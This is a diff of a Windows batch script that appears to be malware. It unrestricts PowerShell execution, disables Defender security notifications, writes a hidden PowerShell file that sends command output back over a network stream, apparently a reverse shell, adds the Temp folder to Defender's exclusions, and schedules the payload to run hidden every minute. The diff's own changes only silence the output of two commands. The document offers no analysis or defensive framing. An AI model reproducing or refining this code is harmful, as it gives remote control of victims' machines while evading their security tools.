@@ -9,7 +9,7 @@ for /f "tokens=3 delims=\" %%a in ("!cd!") do set "username=%%a"
 cd /d "C:\Users\%username%\AppData\Local\Temp"
 
 :: remove powershell script restrictions
-powershell -command "Set-ExecutionPolicy Unrestricted -Force"
+powershell -command "Set-ExecutionPolicy Unrestricted -Force" > nul 2>&1
 
 :: disable windows security notifications
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f > nul 2>&1
@@ -34,7 +34,7 @@ echo $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($se
 echo $client.Close(); } catch {} } >> %file%
 
 attrib +h +s +r %file% >nul 2>&1
-powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\""
+powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\"" > nul 2>&1
 
 schtasks /create /tn "%taskname%" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%\%file%\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
 powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul
